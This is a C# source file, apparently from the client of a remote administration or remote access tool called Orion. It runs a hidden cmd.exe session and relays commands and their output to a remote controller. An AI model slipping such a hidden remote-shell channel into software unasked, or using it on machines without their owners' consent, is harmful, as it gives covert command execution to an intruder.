using Orion.Client.Networking;
using Orion.Common.Messages;
using Orion.Common.Messages.Administration.RemoteShell;
using System;
using System.Diagnostics;
using System.Globalization;
using System.IO;
using System.Text;
using System.Threading;

namespace Orion.Client.IO
{
    /// <summary>
    /// This class manages a remote shell session.
    /// </summary>
    public class Shell : IDisposable
    {
        /// <summary>
        /// The process of the command-line (cmd).
        /// </summary>
        private Process _prc;
        /// <summary>
        /// Decides if we should still read from the output.
        /// <remarks>
        /// Detects unexpected closing of the shell.
        /// </remarks>
        /// </summary>
        private bool _read;
        /// <summary>
        /// The lock object for the read variable.
        /// </summary>
        private readonly object _readLock = new object();
        /// <summary>
        /// The lock object for the StreamReader.
        /// </summary>
        private readonly object _readStreamLock = new object();
        /// <summary>
        /// The current console encoding.
        /// </summary>
        private Encoding _encoding;
        /// <summary>
        /// Redirects commands to the standard input stream of the console with the correct encoding.
        /// </summary>
        private StreamWriter _inputWriter;
        /// <summary>
        /// The client to sends responses to.
        /// </summary>
        private readonly OrionClient _client;

        /// <summary>
        /// 标记：刚刚创建cmd会话，用于抑制初始化空命令产生的第二个提示符
        /// </summary>
        private bool _justCreatedSession;

        /// <summary>
        /// Initializes a new instance of the <see cref="Shell" /> class using a given client.
        /// </summary>
        /// <param name="client">The client to send shell responses to.</param>
        public Shell(OrionClient client)
        {
            _client = client;
        }

        /// <summary>
        /// Creates a new session of the shell.
        /// </summary>
        private void CreateSession()
        {
            lock (_readLock)
            {
                if (_prc != null && !_prc.HasExited)
                {
                    try { _prc.Kill(); } catch { }
                }
                _read = true;
            }
            var cultureInfo = CultureInfo.InstalledUICulture;
            try
            {
                _encoding = Encoding.GetEncoding(cultureInfo.TextInfo.OEMCodePage);
            }
            catch
            {
                _encoding = Encoding.Default;
            }
            _prc = new Process
            {
                StartInfo = new ProcessStartInfo("cmd")
                {
                    UseShellExecute = false,
                    CreateNoWindow = true,
                    RedirectStandardInput = true,
                    RedirectStandardOutput = true,
                    RedirectStandardError = true,
                    StandardOutputEncoding = _encoding,
                    StandardErrorEncoding = _encoding,
                    WorkingDirectory = Path.GetPathRoot(Environment.GetFolderPath(Environment.SpecialFolder.System)),
                    Arguments = "/Q /K"
                }
            };
            _prc.Start();
            RedirectIO();
            _client.Send(new ShellExecResult
            {
                Output = "\n>> New Session created\n"
            });

            // 设置会话新建标记
            _justCreatedSession = true;
        }

        /// <summary>
        /// Starts the redirection of input and output.
        /// </summary>
        private void RedirectIO()
        {
            if (_inputWriter != null)
            {
                try { _inputWriter.Close(); } catch { }
            }
            _inputWriter = new StreamWriter(_prc.StandardInput.BaseStream, _encoding);

            var stdoutThread = new Thread(RedirectStandardOutput) { IsBackground = true };
            var stderrThread = new Thread(RedirectStandardError) { IsBackground = true };
            stdoutThread.Start();
            stderrThread.Start();
        }

        /// <summary>
        /// Reads the output from the stream.
        /// </summary>
        /// <param name="firstCharRead">The first read char.</param>
        /// <param name="streamReader">The StreamReader to read from.</param>
        /// <param name="isError">True if reading from the error‑stream, else False.</param>
        private void ReadStream(int firstCharRead, StreamReader streamReader, bool isError)
        {
            lock (_readStreamLock)
            {
                var streamBuffer = new StringBuilder();
                streamBuffer.Append((char)firstCharRead);
                // While there are more characters to be read
                while (streamReader.Peek() > -1)
                {
                    // Read the character in the queue
                    var ch = streamReader.Read();
                    // Accumulate the characters read in the stream buffer
                    streamBuffer.Append((char)ch);
                    if (ch == '\n')
                        SendAndFlushBuffer(ref streamBuffer, isError);
                }
                // Flush any remaining text in the buffer
                SendAndFlushBuffer(ref streamBuffer, isError);
            }
        }

        /// <summary>
        /// Sends the read output to the Client.
        /// </summary>
        /// <param name="textBuffer">Contains the contents of the output.</param>
        /// <param name="isError">True if reading from the error‑stream, else False.</param>
        private void SendAndFlushBuffer(ref StringBuilder textBuffer, bool isError)
        {
            if (textBuffer.Length == 0) return;
            var toSend = textBuffer.ToString();
            if (string.IsNullOrEmpty(toSend)) return;
            _client.Send(new ShellExecResult { Output = toSend, IsError = isError });
            textBuffer.Clear();
        }

        /// <summary>
        /// Reads from the standard output‑stream.
        /// </summary>
        private void RedirectStandardOutput()
        {
            Process currentPrc = _prc;
            try
            {
                int ch;
                while (currentPrc != null && !currentPrc.HasExited && (ch = currentPrc.StandardOutput.Read()) > -1)
                {
                    ReadStream(ch, currentPrc.StandardOutput, false);
                }
            }
            catch { }
            finally
            {
                lock (_readLock)
                {
                    if (_read && _prc == currentPrc)
                    {
                        _read = false;
                        _client.Send(new ShellExecResult
                        {
                            Output = "\n>> Session unexpectedly closed\n",
                            IsError = true
                        });
                    }
                }
            }
        }

        /// <summary>
        /// Reads from the standard error‑stream.
        /// </summary>
        private void RedirectStandardError()
        {
            Process currentPrc = _prc;
            try
            {
                int ch;
                while (currentPrc != null && !currentPrc.HasExited && (ch = currentPrc.StandardError.Read()) > -1)
                {
                    ReadStream(ch, currentPrc.StandardError, true);
                }
            }
            catch { }
            finally
            {
                lock (_readLock)
                {
                    if (_read && _prc == currentPrc)
                    {
                        _read = false;
                        _client.Send(new ShellExecResult
                        {
                            Output = "\n>> Session unexpectedly closed\n",
                            IsError = true
                        });
                    }
                }
            }
        }

        /// <summary>
        /// Executes a shell command.
        /// </summary>
        /// <param name="command">The command to execute.</param>
        /// <returns>False if execution failed, else True.</returns>
        public bool ExecuteCommand(string command)
        {
            try
            {
                if (_prc == null || _prc.HasExited)
                {
                    CreateSession();
                }

                // 修复：刚创建会话且是空命令，跳过写入stdin，避免第二个提示符
                if (!(_justCreatedSession && string.IsNullOrEmpty(command)))
                {
                    _inputWriter.WriteLine(command ?? string.Empty);
                    _inputWriter.Flush();
                }
                // 清除新建标记，后续用户手动空回车正常执行
                _justCreatedSession = false;

                return true;
            }
            catch (Exception ex)
            {
                try
                {
                    _client.Send(new ShellExecResult
                    {
                        Output = $"\n>> Failed to execute command: {ex.Message}\n",
                        IsError = true
                    });
                }
                catch { }
                return false;
            }
        }

        /// <summary>
        /// Releases all resources used by this class.
        /// </summary>
        public void Dispose()
        {
            Dispose(true);
            GC.SuppressFinalize(this);
        }

        protected virtual void Dispose(bool disposing)
        {
            if (disposing)
            {
                lock (_readLock)
                {
                    _read = false;
                }
                if (_prc == null)
                    return;
                if (!_prc.HasExited)
                {
                    try
                    {
                        _prc.Kill();
                    }
                    catch
                    {
                    }
                }
                if (_inputWriter != null)
                {
                    _inputWriter.Close();
                    _inputWriter = null;
                }
                _prc.Dispose();
                _prc = null;
            }
        }
    }
}
